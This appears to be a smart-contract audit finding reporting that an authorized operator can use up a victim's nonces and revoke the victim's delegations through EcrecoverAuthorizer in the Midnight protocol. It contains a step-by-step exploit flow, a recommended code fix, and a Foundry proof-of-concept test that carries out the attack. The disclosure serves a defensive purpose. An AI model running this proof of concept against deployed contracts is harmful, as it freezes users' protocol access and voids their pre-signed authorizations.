### Title
Authorized operator can consume victim's `EcrecoverAuthorizer` nonces and revoke victim's delegations - (`File: src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts any signer who is Midnight-authorized by `authorization.authorizer`, not just the authorizer themselves. This means any operator holding `isAuthorized[victim][operator] == true` on Midnight can sign and submit `Authorization` structs naming `victim` as `authorizer`, consuming `nonce[victim]` and revoking victim's existing Midnight delegations — without victim's consent for those specific actions.

### Finding Description
The signer check at `src/periphery/EcrecoverAuthorizer.sol` line 33–36 is:

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

This permits any Midnight-authorized signer to act as the `authorizer`. The nonce increment at line 26 fires unconditionally before this check:

```solidity
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
``` [2](#0-1) 

And the downstream Midnight call at lines 46–47 uses `authorization.authorizer` as `onBehalf`:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
``` [3](#0-2) 

`Midnight.setIsAuthorized` at line 732 only requires `isAuthorized[onBehalf][msg.sender]` — i.e., that `EcrecoverAuthorizer` is authorized by victim — which is the standard setup for any user of this periphery contract: [4](#0-3) 

**Exploit flow:**

Preconditions (both set by victim, both realistic):
- `isAuthorized[victim][EcrecoverAuthorizer] == true` (victim uses EcrecoverAuthorizer for gasless flows)
- `isAuthorized[victim][operator] == true` (victim authorized operator for some purpose)

Attack sequence:
1. Operator constructs `Authorization{authorizer=victim, authorized=X, isAuthorized=false, nonce=N}` for any target `X` and current `nonce[victim]`.
2. Operator signs with their own key.
3. Operator calls `EcrecoverAuthorizer.setIsAuthorized(auth, sig)`.
4. Signer check passes: `IMidnight(MIDNIGHT).isAuthorized(victim, operator) == true`.
5. `nonce[victim]` is incremented from `N` to `N+1`.
6. `Midnight.setIsAuthorized(X, false, victim)` executes, revoking `isAuthorized[victim][X]`.
7. Repeat for nonces `N+1`, `N+2`, … to consume all of victim's nonces and revoke all of victim's delegations.

No existing check stops this. The `Unauthorized()` guard only verifies that the signer is Midnight-authorized by the authorizer — it does not restrict which `authorizer` the signer may impersonate, nor does it prevent nonce consumption on behalf of a third party.

### Impact Explanation
The operator can revoke every `isAuthorized[victim][*]` entry on Midnight (including EcrecoverAuthorizer itself, other operators, ratifiers) and simultaneously exhaust `nonce[victim]`, permanently invalidating any pre-signed `Authorization` structs victim has distributed (e.g., to relayers or gasless-tx infrastructure). Victim's protocol access — withdrawals, repayments, offer management, collateral operations — is frozen until victim re-authorizes each party via direct on-chain calls, and all previously shared signed authorizations are unrecoverable.

### Likelihood Explanation
Preconditions are the normal operating state for any user of `EcrecoverAuthorizer`: victim must have authorized both `EcrecoverAuthorizer` and at least one operator. Any such operator — a relayer, automated strategy, or even a counterparty who was granted temporary access — can execute this attack permissionlessly. The attack is repeatable and costs only gas; no capital is required.

### Recommendation
Restrict nonce consumption and signing authority to the `authorization.authorizer` exclusively. Remove the `isAuthorized` delegation path from the signer check in `EcrecoverAuthorizer`:

```solidity
// Before (vulnerable):
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After (fixed):
require(signer == authorization.authorizer, Unauthorized());
```

This preserves the contract's purpose (gasless self-authorization via EIP-712 signature) while ensuring only the authorizer's own key can consume their nonce and modify their delegation state. Operators who need to act on behalf of a user should use the direct `Midnight.setIsAuthorized` path (which already enforces `isAuthorized` correctly without touching EcrecoverAuthorizer nonces).

### Proof of Concept
```solidity
function testOperatorConsumesVictimNonceAndRevokesAuth() public {
    // Setup: victim authorizes EcrecoverAuthorizer and operator on Midnight
    vm.prank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    vm.prank(victim);
    midnight.setIsAuthorized(operator, true, victim);
    // victim also authorizes thirdParty (to be revoked by attacker)
    vm.prank(victim);
    midnight.setIsAuthorized(thirdParty, true, victim);

    // victim pre-signs N authorizations (e.g., for a relayer), nonces 0..N-1
    uint256 N = 5;
    Authorization[] memory victimAuths = new Authorization[](N);
    Signature[] memory victimSigs = new Signature[](N);
    for (uint256 i = 0; i < N; i++) {
        victimAuths[i] = Authorization({
            authorizer: victim, authorized: someAddr, isAuthorized: true,
            nonce: i, deadline: block.timestamp + 1 days
        });
        victimSigs[i] = signAuthorization(victimAuths[i], victim);
    }

    // Operator submits N revocations signed by operator (not victim), consuming nonces 0..N-1
    vm.startPrank(operator);
    for (uint256 i = 0; i < N; i++) {
        Authorization memory attackAuth = Authorization({
            authorizer: victim, authorized: thirdParty, isAuthorized: false,
            nonce: i, deadline: block.timestamp + 1 days
        });
        Signature memory attackSig = signAuthorization(attackAuth, operator);
        ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig);
    }
    vm.stopPrank();

    // Assert: victim's nonce is now N
    assertEq(ecrecoverAuthorizer.nonce(victim), N);
    // Assert: thirdParty's authorization is revoked
    assertFalse(midnight.isAuthorized(victim, thirdParty));
    // Assert: all of victim's pre-signed authorizations now fail with InvalidNonce
    for (uint256 i = 0; i < N; i++) {
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(victimAuths[i], victimSigs[i]);
    }
}
```

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L26-26)
```text
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-36)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L46-47)
```text
        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```
